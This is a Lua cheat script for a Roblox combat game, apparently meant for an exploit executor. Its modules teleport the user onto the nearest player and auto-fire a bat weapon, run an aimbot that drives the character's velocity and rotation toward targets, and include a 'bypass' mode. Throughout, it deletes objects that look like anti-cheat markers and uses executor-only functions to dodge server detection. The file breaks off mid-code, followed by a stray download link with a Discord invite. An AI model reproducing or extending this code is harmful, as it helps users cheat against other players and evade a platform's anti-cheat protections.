    local function getTPBatV1Exact(char, humanoid)
        local bat = char and char:FindFirstChild("Bat")
        if bat and bat:IsA("Tool") then return bat end
        local backpack = LP:FindFirstChildOfClass("Backpack")
        if backpack then
            for _, child in ipairs(backpack:GetChildren()) do
                if child:IsA("Tool") and (child.Name:lower():find("bat", 1, true) or child.Name:lower():find("slap", 1, true)) then
                    pcall(function() humanoid:EquipTool(child) end)
                    return child
                end
            end
        end
        return nil
    end

    local function swingTPBatV1(char, humanoid)
        local bat = getTPBatV1Exact(char, humanoid)
        if not bat then return end
        if bat.Parent ~= char then pcall(function() humanoid:EquipTool(bat) end) end
        if bat.Parent == char then
            pcall(function() bat:Activate() end)
            local remote = bat:FindFirstChildWhichIsA("RemoteEvent")
            if remote then pcall(function() remote:FireServer() end) end
        end
    end

    local function closestTPBatRoot(sticky)
        local char = LP.Character
        local root = char and char:FindFirstChild("HumanoidRootPart")
        if not root then return nil end
        if sticky and sticky.Parent then
            local hum = sticky.Parent:FindFirstChildOfClass("Humanoid")
            if hum and hum.Health > 0 and (root.Position - sticky.Position).Magnitude <= tpBatV2.stickRange then
                return sticky
            end
        end
        local closest, distance = nil, math.huge
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LP and player.Character then
                local r = player.Character:FindFirstChild("HumanoidRootPart")
                local hum = player.Character:FindFirstChildOfClass("Humanoid")
                if r and hum and hum.Health > 0 then
                    local d = (root.Position - r.Position).Magnitude
                    if d < distance then closest, distance = r, d end
                end
            end
        end
        return closest
    end

    local function setTPBatPhysics(_, _)
        -- Intentionally disabled: changing PhysicsRepRootPart is a common
        -- source of replication spikes and server-side kick detection.
    end

    local function runTPBatV1(char, root, humanoid, target)
        trackTPBatV1Target(target)
        local markerCF = getTPBatV1MarkerCFrame(root)
        if markerCF then
            setTPBatPhysics(root, root)
            root.CFrame = markerCF
            local cam = workspace.CurrentCamera
            if cam then cam.CFrame = CFrame.new(cam.CFrame.Position, markerCF.Position) end
            swingTPBatV1(char, humanoid)
            return
        end
        setTPBatPhysics(root, target)
        humanoid.AutoRotate = false
        local pos = target.Position + Vector3.new(0, 0.9, 0)
        if (root.Position - pos).Magnitude > 8 then root.CFrame = CFrame.new(pos) end
        local now = tick()
        if now - (tpBatV1.lastSwing or 0) >= tpBatSwingDelay then
            tpBatV1.lastSwing = now
            swingTPBatV1(char, humanoid)
        end
        local cam = workspace.CurrentCamera
        if cam then cam.CFrame = CFrame.new(cam.CFrame.Position, target.Position) end
    end

    -- Required Adaptsrc V2 helpers. These were missing in the previous port,
    -- which made V2 error on its first heartbeat and stop immediately.
    _G._AdaptTpBatLogic.isVx7Bat = function(tool)
        if not tool or not tool:IsA("Tool") then return false end
        local n = tool.Name:lower()
        return n:find("bat", 1, true) ~= nil or n:find("slap", 1, true) ~= nil
    end
    _G._AdaptTpBatLogic.getVx7Bat = function(char, humanoid)
        for _, child in ipairs(char:GetChildren()) do
            if _G._AdaptTpBatLogic.isVx7Bat(child) then return child end
        end
        local backpack = LP:FindFirstChildOfClass("Backpack") or LP:FindFirstChild("Backpack")
        if backpack then
            for _, child in ipairs(backpack:GetChildren()) do
                if _G._AdaptTpBatLogic.isVx7Bat(child) then
                    pcall(function() humanoid:EquipTool(child) end)
                    return child
                end
            end
        end
        return char:FindFirstChild("Bat")
    end
    _G._AdaptTpBatLogic.closestOshaTpBatRoot = function()
        local char = LP.Character
        local root = char and char:FindFirstChild("HumanoidRootPart")
        if not root then return nil end
        if tpBatV2.target and tpBatV2.target.Parent then
            local parent = tpBatV2.target.Parent
            local hum = parent:FindFirstChildOfClass("Humanoid")
            if hum and hum.Health > 0 and (root.Position - tpBatV2.target.Position).Magnitude <= tpBatV2.stickRange then
                return tpBatV2.target
            end
        end
        local closest, distance = nil, math.huge
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LP and player.Character then
                local r = player.Character:FindFirstChild("HumanoidRootPart")
                local hum = player.Character:FindFirstChildOfClass("Humanoid")
                if r and hum and hum.Health > 0 then
                    local d = (root.Position - r.Position).Magnitude
                    if d < distance then closest, distance = r, d end
                end
            end
        end
        tpBatV2.target = closest
        return closest
    end

    local tpBatV2HitCooling = false
    local function recoverTPBatV2(humanoid)
        pcall(function()
            humanoid.PlatformStand = false
            humanoid.Sit = false
            for _, state in ipairs({Enum.HumanoidStateType.FallingDown, Enum.HumanoidStateType.Ragdoll,
                Enum.HumanoidStateType.GettingUp, Enum.HumanoidStateType.Running,
                Enum.HumanoidStateType.Freefall, Enum.HumanoidStateType.Landed}) do
                humanoid:SetStateEnabled(state, true)
            end
            local state = humanoid:GetState()
            if state == Enum.HumanoidStateType.Physics or state == Enum.HumanoidStateType.Ragdoll
                or state == Enum.HumanoidStateType.FallingDown or state == Enum.HumanoidStateType.PlatformStanding then
                humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
            end
        end)
    end

    local function hitTPBatV2(char, humanoid, targetPart)
        if tpBatV2HitCooling then return end
        tpBatV2HitCooling = true
        local bat = _G._AdaptTpBatLogic.getVx7Bat(char, humanoid)
        pcall(function()
            if bat and bat.Parent ~= char then humanoid:EquipTool(bat) end
            if bat and bat.Parent == char then
                bat:Activate()
                local handle = bat:FindFirstChild("Handle")
                if handle and targetPart and firetouchinterest then
                    firetouchinterest(handle, targetPart, 0)
                    firetouchinterest(handle, targetPart, 1)
                end
                local remote = bat:FindFirstChildWhichIsA("RemoteEvent", true)
                if remote then remote:FireServer() end
            end
        end)
        _G._AdaptYoutTpBatV2.hitCooling = true
        task.delay(math.clamp(tonumber(tpBatSwingDelay) or 0.02, 0.02, 1), function()
            tpBatV2HitCooling = false
            _G._AdaptYoutTpBatV2.hitCooling = false
        end)
    end

    -- V2 follows Adaptsrc's recovery + gradual pull path, while retaining
    -- its marker fallback for targets outside the playable bounds.
    local function runTPBatV2(char, root, humanoid, target)
        recoverTPBatV2(humanoid)
        -- Adaptsrc V2 first uses the same safe marker fallback as V1.
        -- Without this branch the direct pull can move the local root outside
        -- the playable area when the target is already out of bounds.
        trackTPBatV1Target(target)
        local markerCF = getTPBatV1MarkerCFrame(root)
        if markerCF then
            root.CFrame = markerCF
            local camera = workspace.CurrentCamera
            if camera then camera.CFrame = CFrame.new(camera.CFrame.Position, markerCF.Position) end
            local now = tick()
            if now - tpBatV2.lastSwing >= tpBatSwingDelay then
                tpBatV2.lastSwing = now
                hitTPBatV2(char, humanoid, nil)
            end
            return
        end
        tpBatV2.target = target
        setTPBatPhysics(root, target)
        local parent = target.Parent
        local upperTorso = parent and (parent:FindFirstChild("UpperTorso") or parent:FindFirstChild("Torso")) or target
        local velocity = target.AssemblyLinearVelocity
        local position = upperTorso.Position + Vector3.new(0, tpBatV2.height, 0)
            + Vector3.new(velocity.X, velocity.Y * 0.25, velocity.Z) * 0.07
        local magnitude = (position - root.Position).Magnitude
        if magnitude > tpBatV2.snapDistance then
            root.Position = root.Position:Lerp(position, magnitude > 55 and 0.42 or magnitude > 25 and 0.55 or 0.55)
            local delta = position - root.Position
            if delta.Magnitude > 0.001 then
                root.AssemblyLinearVelocity = delta.Unit * math.clamp(delta.Magnitude * tpBatV2.pull, 35, tpBatV2.maxVelocity)
            end
        else
            for _ = 1, 4 do
                root.Position = position
                root.AssemblyLinearVelocity = Vector3.zero
                root.AssemblyAngularVelocity = Vector3.zero
                root.CFrame = CFrame.new(position, position + target.CFrame.LookVector)
            end
        end
        pcall(function()
            humanoid.AutoRotate = false
            local face = parent and parent:FindFirstChild("HumanoidRootPart") or target
            root.CFrame = CFrame.lookAt(root.Position, Vector3.new(face.Position.X, root.Position.Y, face.Position.Z))
            local camera = workspace.CurrentCamera
            if camera then camera.CFrame = CFrame.new(camera.CFrame.Position, target.Position) end
        end)
        local now = tick()
        if now - tpBatV2.lastSwing >= tpBatSwingDelay then
            tpBatV2.lastSwing = now
            hitTPBatV2(char, humanoid, upperTorso)
        end
    end

    -- V3: direct teleport-and-hit path based on message.txt TP Bat logic.
    local function runTPBatV3(char, root, humanoid, target)
        if not target or not target.Parent then return end
        local bat = getBatTP(char, humanoid)
        local targetPosition = target.Position + Vector3.new(0, 2.5, 0)
        root.CFrame = CFrame.new(targetPosition, target.Position)
        root.AssemblyLinearVelocity = target.AssemblyLinearVelocity
        local camera = workspace.CurrentCamera
        if camera then camera.CFrame = CFrame.new(camera.CFrame.Position, target.Position) end
        if bat and bat.Parent ~= char then pcall(function() humanoid:EquipTool(bat) end) end
        if bat and bat.Parent == char and tick() - tpBatV3LastSwing >= 0.08 then
            tpBatV3LastSwing = tick()
            pcall(function() bat:Activate() end)
            local remote = bat:FindFirstChildWhichIsA("RemoteEvent", true)
            if remote then pcall(function() remote:FireServer() end) end
        end
    end

    local function tpBatTick()
        if not tpBatActive then return end
        local char = LP.Character
        local root = char and char:FindFirstChild("HumanoidRootPart")
        local humanoid = char and char:FindFirstChildOfClass("Humanoid")
        if not char or not root or not humanoid or humanoid.Health <= 0 then return end
        local selectedMode = __HH.tpBatMode or "V2"
        local isV1 = selectedMode == "V1"
        local isV3 = selectedMode == "V3"
        _G._AdaptTpBatMode = isV3 and "DIRECT" or (isV1 and "LOW PING" or "HIGH PING")
        _G._AdaptTpBatActive = true
        if not isV1 then clearTPBatV1Marker() end
        local target = isV3 and closestTPBatRoot(nil) or (isV1 and closestTPBatRoot(nil) or _G._AdaptTpBatLogic.closestOshaTpBatRoot())
        if not target then return end
        if isV3 then runTPBatV3(char, root, humanoid, target) elseif isV1 then runTPBatV1(char, root, humanoid, target) else runTPBatV2(char, root, humanoid, target) end
    end

    function startTPLock()
        if tpBatActive then return end

        -- Horizon integration: turn off AIM BOT / Auto Left / Auto Right first (unrelated to M10RU logic below)
        if __HH.batV2Enabled and toggleBatV2 then pcall(toggleBatV2) end
        if autoLeftEnabled and stopAutoLeft then
            autoLeftEnabled = false
            pcall(stopAutoLeft)
        end
        if autoRightEnabled and stopAutoRight then
            autoRightEnabled = false
            pcall(stopAutoRight)
        end

        if _G.HorizonStealModes then _G.HorizonStealModes.Suspend() end
        if __HH.stopBodyLock then __HH.stopBodyLock() end
        local startChar = LP.Character
        local startHumanoid = startChar and startChar:FindFirstChildOfClass("Humanoid")
        tpBatPreviousAutoRotate = startHumanoid and startHumanoid.AutoRotate
        tpBatV1.lastSwing = 0
        tpBatV2.lastSwing = 0
        tpBatV3LastSwing = 0
        tpBatV2.target = nil
        tpBatActive = true
        _G._AdaptTpBatActive = true
        _G._AdaptTpBatSwingCooldown = false
        __HH.tpLockEnabled = true
        __HH.antiVoidTPBat = true
        __HH._tpBatOldAntiDie = __HH.antiDieEnabled
        __HH.antiDieEnabled = true
        if __HH.startAntiDie then __HH.startAntiDie() end
        if tpBatHeartbeat then tpBatHeartbeat:Disconnect() end
        tpBatHeartbeat = RunService.Heartbeat:Connect(tpBatTick)

        if __HH.tpLockSetVisual then __HH.tpLockSetVisual(true) end
        if __HH.mobBtnRefs and __HH.mobBtnRefs.tpLock then __HH.mobBtnRefs.tpLock(true) end
        return true
    end

    function stopTPLock()
        if not tpBatActive then return end
        tpBatActive = false
        _G._AdaptTpBatActive = false
        _G._AdaptTpBatSwingCooldown = false
        __HH.tpLockEnabled = false
        clearTPBatV1Marker()
        tpBatV1.target = nil
        tpBatV1.lastSafeCFrame = nil
        tpBatV2.target = nil
        __HH.antiVoidTPBat = false
        if __HH._tpBatOldAntiDie ~= nil then
            __HH.antiDieEnabled = __HH._tpBatOldAntiDie
            if __HH.antiDieEnabled and __HH.startAntiDie then __HH.startAntiDie() elseif __HH.stopAntiDie then __HH.stopAntiDie() end
            __HH._tpBatOldAntiDie = nil
        end
        if _G.HorizonStealModes then _G.HorizonStealModes.Resume() end
        if __HH.bodyLockEnabled and __HH.startBodyLock then task.delay(0.2,__HH.startBodyLock) end

        if tpBatHeartbeat then
            tpBatHeartbeat:Disconnect()
            tpBatHeartbeat = nil
        end
        do
            local char = LP.Character
            local hrp = char and char:FindFirstChild("HumanoidRootPart")
            local hum = char and char:FindFirstChildOfClass("Humanoid")
            if hrp and type(sethiddenproperty) == "function" then
                pcall(function() sethiddenproperty(hrp, "PhysicsRepRootPart", nil) end)
            end
            if hum and tpBatPreviousAutoRotate ~= nil then hum.AutoRotate = tpBatPreviousAutoRotate end
            tpBatPreviousAutoRotate = nil
        end
        tpBatV2HitCooling = false

        if __HH.tpLockSetVisual then __HH.tpLockSetVisual(false) end
        if __HH.mobBtnRefs and __HH.mobBtnRefs.tpLock then __HH.mobBtnRefs.tpLock(false) end
    end

    function toggleTPLock()
        if tpBatActive then
            stopTPLock()
        else
            startTPLock()
        end
        return __HH.tpLockEnabled
    end

    _G.PureTPBatV4Start = startTPLock
    _G.PureTPBatV4Stop = stopTPLock
    _G.PureTPBatV4Toggle = toggleTPLock

end


do
-- ============ FR "GOOD AIMBOT" ============
-- Ported from FR's merged aimbots.
-- (LockBAV / LockAngVel / BatLock / ...) each heartbeat, drives rotation
-- through its own AngularVelocity (_GB_AngV) and moves with raw Velocity.
    local Players = game:GetService("Players")
    local RunService = game:GetService("RunService")
    local LP = Players.LocalPlayer

    local GOOD_CFG = { SPEED = 58, VERT_SPEED = 58, LOOK_OFFSET = 5, antiLaggerMode = false, SPEED_LIMIT = 60 }
    local GOOD_TURN_SPEED = 40
    local GOOD_MAX_TURN   = 28

    local goodEnabled         = false
    local goodEquippedThisRun = false
    local goodAngVelc         = nil
    local goodAngVelcAtt      = nil
    local _goodIntendedVel    = Vector3.zero
    local _goodTarget         = nil

    local _tpDownLastY     = 0
    local _tpDownTracked    = nil
    local _tpDownCooldown   = false


    local function purgeHRP(hrp)
        if not hrp then return end
        pcall(function()
            for _, n in ipairs(DETECT_NAMES) do
                local o = hrp:FindFirstChild(n)
                if o then o:Destroy() end
            end
            for _, c in ipairs(hrp:GetChildren()) do
                local low = c.Name:lower()
                if c.Name ~= "_GB_AngV" and c.Name ~= "_GB_Att"
                and (low:find("lockb") or low:find("lockangv") or low:find("batlock") or low:find("antiaim") or low:find("velocitylock")) then
                    pcall(function() c:Destroy() end)
                end
            end
        end)
    end

    local function setupGoodAngVelc(hrp)
        pcall(function()
            local o1 = hrp:FindFirstChild("_GB_AngV")
            local o2 = hrp:FindFirstChild("_GB_Att")
            if o1 then o1:Destroy() end
            if o2 then o2:Destroy() end
        end)
        local att = Instance.new("Attachment"); att.Name = "_GB_Att"; att.Parent = hrp
        local av = Instance.new("AngularVelocity")
        av.Name = "_GB_AngV"; av.Attachment0 = att
        av.RelativeTo = Enum.ActuatorRelativeTo.World
        av.MaxTorque = math.huge; av.AngularVelocity = Vector3.zero; av.Parent = hrp
        goodAngVelcAtt = att; goodAngVelc = av
    end

    local function cleanGoodAngVelc()
        pcall(function() if goodAngVelc    and goodAngVelc.Parent    then goodAngVelc:Destroy()    end end)
        pcall(function() if goodAngVelcAtt and goodAngVelcAtt.Parent then goodAngVelcAtt:Destroy() end end)
        goodAngVelc = nil; goodAngVelcAtt = nil
    end

    local function goodEnable()
        goodEquippedThisRun = false; goodEnabled = true; _goodIntendedVel = Vector3.zero
        local char = LP.Character; local hrp = char and char:FindFirstChild("HumanoidRootPart")
        if hrp then purgeHRP(hrp); setupGoodAngVelc(hrp) end
    end

    local function goodDisable()
        goodEnabled = false; goodEquippedThisRun = false
        local char = LP.Character
        local hrp  = char and char:FindFirstChild("HumanoidRootPart")
        local hum  = char and char:FindFirstChildOfClass("Humanoid")
        if hrp then hrp.Velocity = hrp.Velocity * 0.3; purgeHRP(hrp) end
        if hum then hum.AutoRotate = true end
        if goodAngVelc then pcall(function() goodAngVelc.AngularVelocity = Vector3.zero end) end
        cleanGoodAngVelc()
    end

    local function detectTPDown()
        local target = _goodTarget
        if not target or not target.Parent then
            _tpDownLastY = 0; _tpDownTracked = nil
            return false
        end
        if _tpDownTracked ~= target then
            _tpDownTracked = target; _tpDownLastY = target.Position.Y
            return false
        end
        local y = target.Position.Y
        local drop = _tpDownLastY - y
        _tpDownLastY = y
        local velY = target.Velocity.Y
        return (drop > 20) or (drop > 8 and velY < -80)
    end

    local function executeTPDownCounter()
        if _tpDownCooldown then return end
        local char = LP.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        local filterList = {}
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr.Character then table.insert(filterList, plr.Character) end
        end
        local rayParams = RaycastParams.new()
        rayParams.FilterDescendantsInstances = filterList
        rayParams.FilterType = Enum.RaycastFilterType.Exclude
        rayParams.IgnoreWater = false
        local rayResult = workspace:Raycast(hrp.Position, Vector3.new(0, -1000, 0), rayParams)
        if rayResult then
            _tpDownCooldown = true
            hrp.Velocity = Vector3.zero
            hrp.AssemblyAngularVelocity = Vector3.zero
            hrp.CFrame = CFrame.new(rayResult.Position + Vector3.new(0, 3, 0))
            task.delay(0.05, function() _tpDownCooldown = false end)
        end
    end

    RunService.Heartbeat:Connect(function()
        if not goodEnabled then return end
        local char = LP.Character
        local hum  = char and char:FindFirstChildOfClass("Humanoid")
        local root = char and char:FindFirstChild("HumanoidRootPart")
        if not root or not hum then return end
        purgeHRP(root)
        pcall(function()
            if _G and _G.FR_State then
            end
        end)
        if detectTPDown() then executeTPDownCounter() end
        if not goodAngVelc or not goodAngVelc.Parent then setupGoodAngVelc(root) end
        if not goodEquippedThisRun then
            goodEquippedThisRun = true
            if not char:FindFirstChildOfClass("Tool") then
                local bp  = LP:FindFirstChild("Backpack")
                local bat = bp and bp:FindFirstChild("Bat")
                if bat then pcall(function() hum:EquipTool(bat) end) end
            end
        end
        local closestTR, closestDist = nil, math.huge
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LP and plr.Character then
                local tr = plr.Character:FindFirstChild("HumanoidRootPart")
                local h2 = plr.Character:FindFirstChildOfClass("Humanoid")
                if tr and h2 and h2.Health > 0 then
                    local d = (tr.Position - root.Position).Magnitude
                    if d < closestDist then closestDist = d; closestTR = tr end
                end
            end
        end
        if closestTR then
            if _goodTarget ~= closestTR then _goodTarget = closestTR end
            local _vs     = closestTR.Velocity.Magnitude
            local _dynOff = _vs < 0.1 and 1.5 or GOOD_CFG.LOOK_OFFSET
            local fp      = closestTR.Position + closestTR.CFrame.LookVector * _dynOff
            local look    = fp - root.Position
            local flatLook = Vector3.new(look.X, 0, look.Z)
            hum.AutoRotate = false
            if look.Magnitude > 0.01 and flatLook.Magnitude > 0.01 then
                local tYaw  = math.deg(math.atan2(-flatLook.X, -flatLook.Z))
                local yawD  = (tYaw - root.Orientation.Y + 180) % 360 - 180
                local tPit  = math.deg(math.atan2(look.Y, flatLook.Magnitude))
                local pitD  = (tPit - root.Orientation.X + 180) % 360 - 180
                local yawR  = math.clamp(math.rad(yawD) * GOOD_TURN_SPEED, -GOOD_MAX_TURN, GOOD_MAX_TURN)
                local pitR  = math.clamp(math.rad(pitD) * GOOD_TURN_SPEED, -GOOD_MAX_TURN, GOOD_MAX_TURN)
                local yRad  = math.rad(root.Orientation.Y)
                local rAxis = Vector3.new(math.cos(yRad), 0, -math.sin(yRad))
                goodAngVelc.AngularVelocity = Vector3.new(0, yawR, 0) + (rAxis * pitR)
            else
                goodAngVelc.AngularVelocity = Vector3.zero
            end
            local mDir = fp - root.Position
            local hDir = Vector3.new(mDir.X, 0, mDir.Z)

            local effectiveSpeed = GOOD_CFG.SPEED
            if GOOD_CFG.antiLaggerMode then
                local targetHorizSpeed = Vector3.new(closestTR.Velocity.X, 0, closestTR.Velocity.Z).Magnitude
                if targetHorizSpeed < 30 then
                    effectiveSpeed = 30
                else
                    effectiveSpeed = math.min(GOOD_CFG.SPEED_LIMIT, targetHorizSpeed)
                end
            end

            local hVel = hDir.Magnitude > 0.1 and hDir.Unit * effectiveSpeed or Vector3.zero
            local vVel = math.abs(mDir.Y) > 0.8
                and Vector3.new(0, math.sign(mDir.Y) * GOOD_CFG.VERT_SPEED, 0)
                or  Vector3.new(0, -2, 0)
            _goodIntendedVel = hVel + vVel; root.Velocity = _goodIntendedVel
            if hDir.Magnitude > 0.5 then hum:Move(hDir.Unit, false) end
            if closestDist <= 5 then
                local bat = char:FindFirstChild("Bat")
                if bat and bat:IsA("Tool") then
                    pcall(function()
                        bat:Activate()
                        local ev = bat:FindFirstChildWhichIsA("RemoteEvent")
                        if ev then ev:FireServer() end
                    end)
                end
            end
        else
            _goodTarget = nil
            hum.AutoRotate = true
            if goodAngVelc then pcall(function() goodAngVelc.AngularVelocity = Vector3.zero end) end
        end
    end)

    RunService.RenderStepped:Connect(function()
        if not goodEnabled then return end
        local char = LP.Character
        local root = char and char:FindFirstChild("HumanoidRootPart")
        if not root then return end
        local v = root.Velocity
        if math.abs(v.X) > 350 or math.abs(v.Z) > 350 then root.Velocity = _goodIntendedVel end
        purgeHRP(root)
    end)

    LP.CharacterAdded:Connect(function(char)
        task.wait(0.5)
        goodEquippedThisRun = false
        _tpDownLastY = 0; _tpDownTracked = nil
        _goodTarget = nil
        if goodEnabled then
            local hrp = char:WaitForChild("HumanoidRootPart", 5)
            if hrp then purgeHRP(hrp); setupGoodAngVelc(hrp) end
        end
    end)

    _G.HHGoodAimSet   = function(on) if on then goodEnable() else goodDisable() end end
    _G.HHGoodAimGet   = function() return goodEnabled end
    _G.HHGoodAimPurge = purgeHRP
    _G.HHGoodAimCfg   = GOOD_CFG
end

-- PRIME BYPASS V2: prediction/smoothing path ported from message.txt.
do
    local bypassV2Connection = nil
    local bypassV2Enabled = false
    local bypassV2PreviousAutoRotate = nil
    local bypassV2LastPosition = nil
    local bypassV2TargetVelocity = Vector3.zero
    local bypassV2SmoothedVelocity = Vector3.zero
    local bypassV2LastSwing = 0

    local function bypassV2FindBat(character, humanoid)
        local function isBat(tool)
            if not tool or not tool:IsA("Tool") then return false end
            local name = tool.Name:lower()
            return name:find("bat", 1, true) or name:find("slap", 1, true)
        end
        for _, child in ipairs(character:GetChildren()) do
            if isBat(child) then return child end
        end
        local backpack = LP:FindFirstChildOfClass("Backpack")
        if backpack then
            for _, child in ipairs(backpack:GetChildren()) do
                if isBat(child) then
                    pcall(function() humanoid:EquipTool(child) end)
                    return child
                end
            end
        end
        return nil
    end

    local function bypassV2Closest(root)
        local closest, distance = nil, math.huge
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LP and player.Character then
                local targetRoot = player.Character:FindFirstChild("HumanoidRootPart")
                local targetHumanoid = player.Character:FindFirstChildOfClass("Humanoid")
                if targetRoot and targetHumanoid and targetHumanoid.Health > 0 then
                    local currentDistance = (root.Position - targetRoot.Position).Magnitude
                    if currentDistance < distance then
                        closest, distance = targetRoot, currentDistance
                    end
                end
            end
        end
        return closest, distance
    end

    local function bypassV2ResetPrediction()
        bypassV2LastPosition = nil
        bypassV2TargetVelocity = Vector3.zero
        bypassV2SmoothedVelocity = Vector3.zero
        bypassV2LastSwing = 0
    end

    _G.PrimeBypassV2Stop = function()
        bypassV2Enabled = false
        if bypassV2Connection then bypassV2Connection:Disconnect(); bypassV2Connection = nil end
        local character = LP.Character
        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
        local root = character and character:FindFirstChild("HumanoidRootPart")
        if humanoid and bypassV2PreviousAutoRotate ~= nil then humanoid.AutoRotate = bypassV2PreviousAutoRotate end
        if root then root.AssemblyAngularVelocity = Vector3.zero end
        bypassV2PreviousAutoRotate = nil
        bypassV2ResetPrediction()
    end

    _G.PrimeBypassV2Start = function()
        if bypassV2Connection then return true end
        local character = LP.Character
        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
        local root = character and character:FindFirstChild("HumanoidRootPart")
        if not humanoid or not root then return false end
        bypassV2Enabled = true
        bypassV2PreviousAutoRotate = humanoid.AutoRotate
…"
 content://media/external/downloads/1000103100#:~:text=%2D%2D%20By%20https%3A//discord.gg/76wNYBeDxR%0A%0Alocal,content%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20end%0A%20%20%20%20%20%20%20%20%20%20%20%20end%0A%20%20%20%20%20%20%20%20end%0A%20%20%20%20end%0Aend